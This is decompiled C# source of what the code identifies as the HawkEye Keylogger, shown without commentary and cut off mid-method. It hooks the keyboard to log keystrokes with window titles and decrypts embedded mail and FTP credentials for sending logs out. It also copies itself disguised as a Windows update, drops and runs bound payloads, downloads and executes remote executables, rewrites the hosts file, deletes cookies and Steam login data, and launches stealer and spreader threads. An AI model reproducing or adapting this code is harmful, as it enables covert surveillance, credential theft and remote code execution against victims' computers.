﻿// Decompiled with JetBrains decompiler
// Type: Phulli.Form1
// Assembly: Phulli, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5588EA96-561C-40B7-9B78-06ECD0A07CB4
// Assembly location: C:\Users\Voltaren\Desktop\infocenter247 HK.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Phulli.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Phulli
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    private string encryptedemailstring;
    private string encryptedpassstring;
    private string encryptedsmtpstring;
    private string portstring;
    private string timerstring;
    private string fakemgrstring;
    private string encryptedftphost;
    private string encryptedftpuser;
    private string encryptedftppass;
    private string encryptedphplink;
    private string useemail;
    private string useftp;
    private string usephp;
    private string delaytime;
    private string clearie;
    private string clearff;
    private string binder;
    private string downloader;
    private string websitevisitor;
    private string websiteblocker;
    private string notify;
    private string DisableSSL;
    private string fakerror;
    private string startup;
    private string screeny;
    private string clip;
    private string TaskManager;
    private string logger;
    private string stealers;
    private string melt;
    private string reg;
    private string cmd;
    private string misconfig;
    private string spreaders;
    private string steam;
    private int screenynumber;
    private int Minecraftt;
    private int Pinsst;
    private int Bitcoinst;
    private string path;
    private string meltLocation;
    private string appname;
    private string CLog;
    [AccessedThroughProperty("CH")]
    private Clipboard _CH;
    private string emailstring;
    private string passstring;
    private string smtpstring;
    private string ftphost;
    private string ftpuser;
    private string ftppass;
    private string phplink;
    private string ExIP;
    private string LHeader;
    private string RHeader;
    private bool Shift;
    private bool Caps;
    private bool UseCaps;
    private bool BackSpace;
    private const int WM_KEYUP = 257;
    private const short WM_KEYDOWN = 256;
    private const int WM_SYSKEYDOWN = 260;
    private const int WM_SYSKEYUP = 261;
    private IntPtr KeyboardHandle;
    private string LastCheckedForegroundTitle;
    private Form1.KeyboardHookDelegate callback;
    public string KeyLog;
    private string Holder;
    private byte[] WB;
    private byte[] Mail;
    private string InternalIp;
    private string MyAV;
    private string MyFirewall;
    private byte[] mem;
    private string CleanedPasswordsMAIL;
    private string CleanedPasswordsWB;
    private string User;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.encryptedemailstring = "Ta2Jfga3JLt9/E73uK1VhbmPqX+KZVpojbUXbxetRat00dsE6SxRFHnnkl+N7GmF3LYcEmp1wsmdwpIeqqtKrvMNFEgWcQc1oSgh3RbC8S0=";
      this.encryptedpassstring = "Ta2Jfga3JLt9/E73uK1Vhe5QVh+4d19jJIu2I5YX0J4=";
      this.encryptedsmtpstring = "eQXteoT+N5w4JLy6ft+Gqo3cCAAl1K5LvpF/1Zm2tGqLYdVz3MTNS/f5+aHuVF1wYMCX1Jecz/LxXf2Lr/WVvw==";
      this.portstring = "587";
      this.timerstring = "900000";
      this.fakemgrstring = "";
      this.encryptedftphost = "DAsaMA1AiWAMiX7/2niNpvJ+E0CcAZ0/P/PUZITbhX0UWQ8oMH0QOkPNxtwLtBAs";
      this.encryptedftpuser = "wY0LEe9y+2yGXhDXmfDrHo+J8EmuP1ocrF5FrTuC1PY=";
      this.encryptedftppass = "3/BxGIs7loR7FQ9LFgYmxASj436ZcTD4lx8u+gtq6ug=";
      this.encryptedphplink = "PN4TW3peZ3UeXi7asDB56E4dMEf6JrdkxXNUlrUjLlWcjHK1wZ5CpLZZKB/ocuFWy9Kw0Q8tIc1Qv7OEgqzD+w==";
      this.useemail = "yesemail";
      this.useftp = "noftp";
      this.usephp = "nophp";
      this.delaytime = "0";
      this.clearie = "dontclearie";
      this.clearff = "dontclearff";
      this.binder = "bindfiles";
      this.downloader = "downloadfiles";
      this.websitevisitor = nameof (websitevisitor);
      this.websiteblocker = nameof (websiteblocker);
      this.notify = "Disablenotify";
      this.DisableSSL = "EnableSSL";
      this.fakerror = "Disablefakerror";
      this.startup = nameof (startup);
      this.screeny = nameof (screeny);
      this.clip = nameof (clip);
      this.TaskManager = "DisableTaskManager";
      this.logger = nameof (logger);
      this.stealers = nameof (stealers);
      this.melt = "Disablemelt";
      this.reg = "Disablereg";
      this.cmd = "Disablecmd";
      this.misconfig = "Disablemsconfig";
      this.spreaders = "Disablespreaders";
      this.steam = "Disablesteam";
      this.screenynumber = 1;
      this.Minecraftt = 120000;
      this.Pinsst = 140000;
      this.Bitcoinst = 180000;
      this.path = Path.GetTempPath();
      this.meltLocation = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows Update.exe";
      this.appname = Path.GetFileName(Application.ExecutablePath);
      this.CLog = string.Empty;
      this.CH = new Clipboard();
      this.LHeader = "----[";
      this.RHeader = "]----";
      this.UseCaps = false;
      this.BackSpace = false;
      this.KeyboardHandle = (IntPtr) 0;
      this.LastCheckedForegroundTitle = "";
      this.callback = (Form1.KeyboardHookDelegate) null;
      this.mem = Phulli.My.Resources.Resources.CMemoryExecute;
      this.User = WindowsIdentity.GetCurrent().Name.Split('\\')[1];
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num1 = 0;
          int num2 = checked (Form1.__ENCList.Count - 1);
          int index2 = num1;
          while (index2 <= num2)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if ((!disposing || this.components == null) && !false)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
    }

    private virtual Clipboard CH
    {
      [DebuggerNonUserCode] get
      {
        return this._CH;
      }
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        Clipboard.ChangedEventHandler changedEventHandler = new Clipboard.ChangedEventHandler(this.CH_Changed);
        if (this._CH != null)
          this._CH.Changed -= changedEventHandler;
        this._CH = value;
        if (this._CH == null)
          return;
        this._CH.Changed += changedEventHandler;
      }
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int UnhookWindowsHookEx(int hHook);

    [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SetWindowsHookEx(int idHook, Form1.KeyboardHookDelegate lpfn, int hmod, int dwThreadId);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetAsyncKeyState(int vKey);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CallNextHookEx(int hHook, int nCode, int wParam, Form1.KBDLLHOOKSTRUCT lParam);

    [DllImport("tapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long lineSetAppSpecific(long hCall, long dwAppSpecific);

    [DllImport("rtm.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long MgmGetNextMfeStats(ref IntPtr pimmStart, ref long pdwBufferSize, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pbBuffer, ref long pdwNumEntries);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    public string GetActiveWindowTitle()
    {
      string str;
      try
      {
        string lpString = new string(char.MinValue, 100);
        Form1.GetWindowText(Form1.GetForegroundWindow(), ref lpString, 100);
        lpString = lpString.Substring(0, checked (Strings.InStr(lpString, "\0", CompareMethod.Binary) - 1));
        str = lpString;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    private object Hooked()
    {
      object obj;
      try
      {
        obj = (object) (this.KeyboardHandle != (IntPtr) 0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) "";
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public void HookKeyboard()
    {
      try
      {
        this.callback = new Form1.KeyboardHookDelegate(this.KeyboardCallback);
        this.KeyboardHandle = (IntPtr) Form1.SetWindowsHookEx(13, this.callback, (int) Process.GetCurrentProcess().MainModule.BaseAddress, 0);
        if (this.KeyboardHandle != (IntPtr) 0)
          ;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void UnhookKeyboard()
    {
      try
      {
        if (!Conversions.ToBoolean(this.Hooked()) || Form1.UnhookWindowsHookEx((int) this.KeyboardHandle) == 0)
          return;
        this.KeyboardHandle = (IntPtr) 0;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public int KeyboardCallback(int Code, int wParam, ref Form1.KBDLLHOOKSTRUCT lParam)
    {
      int num;
      try
      {
        object activeWindowTitle = (object) this.GetActiveWindowTitle();
        if (Operators.ConditionalCompareObjectNotEqual(activeWindowTitle, (object) this.LastCheckedForegroundTitle, false))
        {
          this.LastCheckedForegroundTitle = Conversions.ToString(activeWindowTitle);
          this.KeyLog = Conversions.ToString(Operators.ConcatenateObject((object) this.KeyLog, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("\r\n\r\n" + this.LHeader), activeWindowTitle), (object) " - "), (object) DateAndTime.Now.ToString()), (object) this.RHeader), (object) "\r\n")));
        }
        string Left = "";
        if (wParam == 256 | wParam == 260)
        {
          if (Code >= 0 && MyProject.Computer.Keyboard.CtrlKeyDown & MyProject.Computer.Keyboard.AltKeyDown & lParam.vkCode == 83)
          {
            num = 1;
            goto label_135;
          }
          else
          {
            switch (lParam.vkCode)
            {
              case 8:
                if (this.KeyLog.EndsWith(this.RHeader + "\r\n") | !this.BackSpace)
                {
                  Left = "[BS]";
                  break;
                }
                string keyLog = this.KeyLog;
                this.KeyLog = this.KeyLog.Remove(checked (this.KeyLog.ToString().Length - 1));
                if (this.KeyLog.EndsWith(this.RHeader + "\r\n"))
                {
                  this.KeyLog = keyLog;
                  Left = "[BS]";
                }
                else
                  Left = "";
                break;
              case 9:
                Left = "\t";
                break;
              case 13:
                Left = "\r\n";
                break;
              case 20:
                if (this.UseCaps)
                {
                  this.Caps = !MyProject.Computer.Keyboard.CapsLock;
                  break;
                }
                Left = !MyProject.Computer.Keyboard.CapsLock ? "[cap]" : "[/cap]";
                break;
              case 27:
                Left = " [esc] ";
                break;
              case 32:
                Left = " ";
                break;
              case 37:
                Left = "[<]";
                break;
              case 38:
                Left = "[^]";
                break;
              case 39:
                Left = "[>]";
                break;
              case 40:
                Left = "[V]";
                break;
              case 46:
                Left = " [del] ";
                break;
              case 48:
              case 49:
              case 50:
              case 51:
              case 52:
              case 53:
              case 54:
              case 55:
              case 56:
              case 57:
                if (this.Shift)
                {
                  Left = Conversions.ToString(Strings.ChrW(lParam.vkCode));
                  if (Operators.CompareString(Left, "1", false) == 0)
                  {
                    Left = "!";
                    break;
                  }
                  if (Operators.CompareString(Left, "2", false) == 0)
                  {
                    Left = "@";
                    break;
                  }
                  if (Operators.CompareString(Left, "3", false) == 0)
                  {
                    Left = "#";
                    break;
                  }
                  if (Operators.CompareString(Left, "4", false) == 0)
                  {
                    Left = "$";
                    break;
                  }
                  if (Operators.CompareString(Left, "5", false) == 0)
                  {
                    Left = "%";
                    break;
                  }
                  if (Operators.CompareString(Left, "6", false) == 0)
                  {
                    Left = "^";
                    break;
                  }
                  if (Operators.CompareString(Left, "7", false) == 0)
                  {
                    Left = "&";
                    break;
                  }
                  if (Operators.CompareString(Left, "8", false) == 0)
                  {
                    Left = "*";
                    break;
                  }
                  if (Operators.CompareString(Left, "9", false) == 0)
                  {
                    Left = "(";
                    break;
                  }
                  if (Operators.CompareString(Left, "0", false) == 0)
                  {
                    Left = ")";
                    break;
                  }
                  break;
                }
                Left = Conversions.ToString(Strings.ChrW(lParam.vkCode));
                break;
              case 65:
              case 66:
              case 67:
              case 68:
              case 69:
              case 70:
              case 71:
              case 72:
              case 73:
              case 74:
              case 75:
              case 76:
              case 77:
              case 78:
              case 79:
              case 80:
              case 81:
              case 82:
              case 83:
              case 84:
              case 85:
              case 86:
              case 87:
              case 88:
              case 89:
              case 90:
                Left = !(this.Shift | this.Caps) ? Conversions.ToString(Strings.ChrW(checked (lParam.vkCode + 32))) : Conversions.ToString(Strings.ChrW(checked (lParam.vkCode + 32))).ToUpper();
                break;
              case 96:
              case 97:
              case 98:
              case 99:
              case 100:
              case 101:
              case 102:
              case 103:
              case 104:
              case 105:
                Left = Conversions.ToString(Strings.ChrW(lParam.vkCode));
                if (Operators.CompareString(Left, "a", false) == 0)
                  Left = Conversions.ToString(1);
                if (Operators.CompareString(Left, "b", false) == 0)
                  Left = Conversions.ToString(2);
                if (Operators.CompareString(Left, "c", false) == 0)
                  Left = Conversions.ToString(3);
                if (Operators.CompareString(Left, "d", false) == 0)
                  Left = Conversions.ToString(4);
                if (Operators.CompareString(Left, "e", false) == 0)
                  Left = Conversions.ToString(5);
                if (Operators.CompareString(Left, "f", false) == 0)
                  Left = Conversions.ToString(6);
                if (Operators.CompareString(Left, "g", false) == 0)
                  Left = Conversions.ToString(7);
                if (Operators.CompareString(Left, "h", false) == 0)
                  Left = Conversions.ToString(8);
                if (Operators.CompareString(Left, "i", false) == 0)
                  Left = Conversions.ToString(9);
                if (Operators.CompareString(Left, "`", false) == 0)
                {
                  Left = Conversions.ToString(0);
                  break;
                }
                break;
              case 109:
              case 189:
                Left = !this.Shift ? "-" : "_";
                break;
              case 110:
              case 190:
                Left = this.Shift ? ">" : ".";
                break;
              case 112:
              case 113:
              case 114:
              case 115:
              case 116:
              case 117:
              case 118:
              case 119:
              case 120:
              case 121:
              case 122:
              case 123:
              case 124:
              case 125:
              case 126:
              case (int) sbyte.MaxValue:
              case 128:
              case 129:
              case 130:
              case 131:
              case 132:
              case 133:
              case 134:
              case 135:
                Left = "[F" + Conversions.ToString(checked (lParam.vkCode - 111)) + "]";
                break;
              case 160:
              case 161:
                if (!this.UseCaps)
                {
                  Left = " [shift] ";
                  break;
                }
                this.Shift = true;
                break;
              case 162:
              case 163:
                Left = " [ctrl] ";
                break;
              case 164:
                Left = " [alt] ";
                break;
              case 165:
                Left = " [ralt] ";
                break;
              default:
                Left = Conversions.ToString(lParam.vkCode);
                if (this.Shift)
                {
                  if (Operators.CompareString(Left, "192", false) == 0)
                    Left = "~";
                  if (Operators.CompareString(Left, "219", false) == 0)
                    Left = "{";
                  if (Operators.CompareString(Left, "221", false) == 0)
                    Left = "}";
                  if (Operators.CompareString(Left, "220", false) == 0)
                    Left = "|";
                  if (Operators.CompareString(Left, "222", false) == 0)
                    Left = "\"";
                  if (Operators.CompareString(Left, "186", false) == 0)
                    Left = ":";
                  if (Operators.CompareString(Left, "188", false) == 0)
                    Left = "<";
                  if (Operators.CompareString(Left, "191", false) == 0)
                    Left = "?";
                  if (Operators.CompareString(Left, "187", false) == 0)
                    Left = "+";
                }
                else if (!this.Shift)
                {
                  if (Operators.CompareString(Left, "192", false) == 0)
                    Left = "`";
                  if (Operators.CompareString(Left, "219", false) == 0)
                    Left = "[";
                  if (Operators.CompareString(Left, "221", false) == 0)
                    Left = "]";
                  if (Operators.CompareString(Left, "220", false) == 0)
                    Left = "\\";
                  if (Operators.CompareString(Left, "222", false) == 0)
                    Left = "'";
                  if (Operators.CompareString(Left, "186", false) == 0)
                    Left = ";";
                  if (Operators.CompareString(Left, "188", false) == 0)
                    Left = ",";
                  if (Operators.CompareString(Left, "191", false) == 0)
                    Left = "/";
                  if (Operators.CompareString(Left, "187", false) == 0)
                    Left = "=";
                }
                if (Operators.CompareString(Left, "107", false) == 0)
                  Left = "+";
                if (Operators.CompareString(Left, "107", false) == 0)
                  Left = "*";
                if (Operators.CompareString(Left, "111", false) == 0)
                  Left = "/";
                if (Operators.CompareString(Left, "44", false) == 0)
                {
                  Left = " [SS] ";
                  break;
                }
                break;
            }
          }
        }
        else if (wParam == 257 | wParam == 261)
        {
          switch (lParam.vkCode)
          {
            case 160:
            case 161:
              if (!this.UseCaps)
                Left = "[/shift]";
              this.Shift = false;
              break;
            case 162:
            case 163:
              Left = "[/ctrl]";
              break;
            case 164:
              Left = "[/lalt]";
              break;
            case 165:
              Left = "[/ralt]";
              break;
          }
        }
        this.KeyLog += Left;
        if (Operators.CompareString(Left, "", false) == 0)
          ;
        num = Form1.CallNextHookEx((int) this.KeyboardHandle, Code, wParam, lParam);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        num = Conversions.ToInteger("");
        ProjectData.ClearProjectError();
      }
label_135:
      return num;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void RestartElevated()
    {
      try
      {
        Process.Start(new ProcessStartInfo()
        {
          UseShellExecute = true,
          WorkingDirectory = Environment.CurrentDirectory,
          FileName = Application.ExecutablePath,
          Verb = "runas"
        });
        Application.Exit();
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Form1_Load(object sender, EventArgs e)
    {
      Thread.Sleep(Conversions.ToInteger(this.delaytime));
      try
      {
        if (Operators.CompareString(this.appname, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsUpdate.exe", false) != 0)
        {
          if (Operators.CompareString(this.melt, "Disablemelt", false) != 0)
          {
            try
            {
              if (Operators.CompareString(Application.ExecutablePath, this.meltLocation, false) != 0)
              {
                if (System.IO.File.Exists(Path.GetTempPath() + "SysInfo.txt"))
                  System.IO.File.Delete(Path.GetTempPath() + "SysInfo.txt");
                System.IO.File.WriteAllText(Path.GetTempPath() + "SysInfo.txt", Application.ExecutablePath);
                if (System.IO.File.Exists(this.meltLocation))
                  System.IO.File.Delete(this.meltLocation);
                System.IO.File.Copy(Application.ExecutablePath, this.meltLocation);
                Process.Start(this.meltLocation);
                ProjectData.EndApp();
              }
              else
              {
                Thread.Sleep(500);
                MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Path.GetTempPath() + "SysInfo.txt")));
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        int id = Process.GetCurrentProcess().Id;
        if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pid.txt"))
          System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pid.txt");
        System.IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pid.txt", id.ToString());
        if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pidloc.txt"))
          System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pidloc.txt");
        System.IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pidloc.txt", Application.ExecutablePath);
        this.emailstring = this.Decrypt(this.encryptedemailstring, "HawkEyeKeylogger");
        this.passstring = this.Decrypt(this.encryptedpassstring, "HawkEyeKeylogger");
        this.smtpstring = this.Decrypt(this.encryptedsmtpstring, "HawkEyeKeylogger");
        this.ftphost = this.Decrypt(this.encryptedftphost, "HawkEyeKeylogger");
        this.ftpuser = this.Decrypt(this.encryptedftpuser, "HawkEyeKeylogger");
        this.ftppass = this.Decrypt(this.encryptedftppass, "HawkEyeKeylogger");
        this.phplink = this.Decrypt(this.encryptedphplink, "HawkEyeKeylogger");
        if (this.IsConnectedToInternet())
        {
          try
          {
            this.InternalIp = this.GetInternalIP();
            this.ExIP = this.GetExternalIP();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        try
        {
          this.MyAV = this.GetAntiVirus();
          this.MyFirewall = this.GetFirewall();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Thread thread1 = new Thread(new ThreadStart(this.FakemsgInstall));
        thread1.SetApartmentState(ApartmentState.STA);
        thread1.Start();
        Thread thread2 = new Thread(new ThreadStart(this.Foldersinstall));
        thread2.SetApartmentState(ApartmentState.STA);
        thread2.Start();
        Thread thread3 = new Thread(new ThreadStart(this.ServerInstall));
        thread3.SetApartmentState(ApartmentState.STA);
        thread3.Start();
        if (Operators.CompareString(this.stealers, "Disablestealers", false) != 0)
        {
          if (this.IsConnectedToInternet())
            new Thread(new ThreadStart(this.StartStealers)).Start();
          new Thread(new ThreadStart(this.Minecraftsub)).Start();
          Thread thread4 = new Thread(new ThreadStart(this.Pins));
          thread4.SetApartmentState(ApartmentState.STA);
          thread4.Start();
        }
        Thread thread5 = new Thread(new ThreadStart(this.Disabler));
        thread5.SetApartmentState(ApartmentState.STA);
        thread5.Start();
        if (Operators.CompareString(this.logger, "Disablelogger", false) != 0)
        {
          this.LHeader = "[";
          this.RHeader = "]";
          this.HookKeyboard();
          this.UseCaps = true;
          if (Operators.CompareString(this.useftp, "noftp", false) != 0)
          {
            Thread thread4 = new Thread(new ThreadStart(this.SendLogsFTP));
            thread4.SetApartmentState(ApartmentState.STA);
            thread4.Start();
          }
          else if (Operators.CompareString(this.usephp, "nophp", false) != 0)
          {
            Thread thread4 = new Thread(new ThreadStart(this.SendLogsPHP));
            thread4.SetApartmentState(ApartmentState.STA);
            thread4.Start();
          }
          else
          {
            Thread thread4 = new Thread(new ThreadStart(this.SendLogs));
            thread4.SetApartmentState(ApartmentState.STA);
            thread4.Start();
          }
        }
        if (Operators.CompareString(this.clip, "Disableclip", false) != 0)
          this.CH.Install();
        if (Operators.CompareString(this.appname, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsUpdate.exe", false) != 0)
        {
          if (Operators.CompareString(this.binder, "bindfiles", false) != 0)
          {
            int num = 0;
            string[] strArray1 = Strings.Split(this.binder, "BSPLIT2", -1, CompareMethod.Binary);
            int index = 0;
            while (index < strArray1.Length)
            {
              string Expression = strArray1[index];
              if (!string.IsNullOrEmpty(Expression.Trim()))
              {
                try
                {
                  checked { ++num; }
                  string[] strArray2 = Strings.Split(Expression, "BSPLIT1", -1, CompareMethod.Binary);
                  byte[] bytes = Convert.FromBase64String(strArray2[0]);
                  string Left = strArray2[1];
                  if (Operators.CompareString(Left, ".exe", false) == 0)
                  {
                    System.IO.File.WriteAllBytes(Path.GetTempPath() + "EBFile_" + Conversions.ToString(num) + Left, bytes);
                    Process.Start(Path.GetTempPath() + "EBFile_" + Conversions.ToString(num) + Left);
                  }
                  else
                  {
                    System.IO.File.WriteAllBytes(Path.GetTempPath() + "BFile_" + Conversions.ToString(num) + Left, bytes);
                    Process.Start(Path.GetTempPath() + "BFile_" + Conversions.ToString(num) + Left);
                  }
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
              checked { ++index; }
            }
          }
          if (this.IsConnectedToInternet() && Operators.CompareString(this.downloader, "downloadfiles", false) != 0)
          {
            int num = 0;
            string[] strArray = Strings.Split(this.downloader, "||", -1, CompareMethod.Binary);
            int index = 0;
            while (index < strArray.Length)
            {
              string str = strArray[index];
              if (!string.IsNullOrEmpty(str.Trim()))
              {
                try
                {
                  checked { ++num; }
                  MyProject.Computer.Network.DownloadFile("http://" + str, Path.GetTempPath() + "DFile_" + Conversions.ToString(num) + ".exe");
                  Process.Start("http://" + str, Path.GetTempPath() + "DFile_" + Conversions.ToString(num) + ".exe");
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
              checked { ++index; }
            }
          }
          if (this.IsConnectedToInternet() && Operators.CompareString(this.websitevisitor, "websitevisitor", false) != 0)
          {
            string[] strArray = Strings.Split(this.websitevisitor, "||", -1, CompareMethod.Binary);
            int index = 0;
            while (index < strArray.Length)
            {
              string str = strArray[index];
              if (!string.IsNullOrEmpty(str.Trim()))
              {
                try
                {
                  Process.Start("http://" + str);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
              checked { ++index; }
            }
          }
        }
        if (Operators.CompareString(this.clearie, "dontclearie", false) != 0 && Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Cookies)))
        {
          string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Cookies));
          int index = 0;
          while (index < files.Length)
          {
            string path = files[index];
            try
            {
              System.IO.File.Delete(path);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            checked { ++index; }
          }
        }
        if (Operators.CompareString(this.clearff, "dontclearff", false) != 0)
        {
          if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles"))
          {
            IEnumerator<string> enumerator1;
            try
            {
              enumerator1 = MyProject.Computer.FileSystem.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles").GetEnumerator();
              while (enumerator1.MoveNext())
              {
                string current1 = enumerator1.Current;
                IEnumerator<string> enumerator2;
                try
                {
                  enumerator2 = MyProject.Computer.FileSystem.GetFiles(current1).GetEnumerator();
                  while (enumerator2.MoveNext())
                  {
                    string current2 = enumerator2.Current;
                    if (current2.Contains("cookie"))
                    {
                      try
                      {
                        System.IO.File.Delete(current2);
                      }
                      catch (Exception ex)
                      {
                        ProjectData.SetProjectError(ex);
                        ProjectData.ClearProjectError();
                      }
                    }
                  }
                }
                finally
                {
                  enumerator2?.Dispose();
                }
              }
            }
            finally
            {
              enumerator1?.Dispose();
            }
            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles");
            int index = 0;
            while (index < files.Length)
            {
              string path = files[index];
              if (path.Contains("cookie"))
              {
                try
                {
                  System.IO.File.Delete(path);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
              checked { ++index; }
            }
          }
        }
        if (Operators.CompareString(this.websiteblocker, "websiteblocker", false) != 0)
        {
          try
          {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts";
            string str1 = System.IO.File.ReadAllText(path);
            string[] strArray = Strings.Split(this.websiteblocker, "||", -1, CompareMethod.Binary);
            int index = 0;
            while (index < strArray.Length)
            {
              string str2 = strArray[index];
              if (!str1.Contains(str2))
                System.IO.File.AppendAllText(path, Environment.NewLine + "127.0.0.1 " + str2);
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(this.steam, "Disablesteam", false) != 0)
          this.ForceSteamLogin();
        if (Operators.CompareString(this.spreaders, "Disablespreaders", false) == 0)
          return;
        Thread thread6 = new Thread(new ThreadStart(this.Spread));
        thread6.SetApartmentState(ApartmentState.STA);
        thread6.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ex.ToString(), MsgBoxStyle.OkOnly, (object) null);
        ProjectData.ClearProjectError();
      }
    }

    public void ForceSteamLogin()
    {
      try
      {
        string str = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Steam";
        string path1 = str + "\\config" + "\\SteamAppData.vdf";
        string path2 = str + "\\ClientRegistry.blob";
        Process[] processesByName = Process.GetProcessesByName("steam");
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
        if (System.IO.File.Exists(path1))
          System.IO.File.Delete(path1);
        if (!System.IO.File.Exists(path2))
          return;
        System.IO.File.Delete(path2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private object IsDotNet(byte[] Bytes)
    {
      object obj;
      try
      {
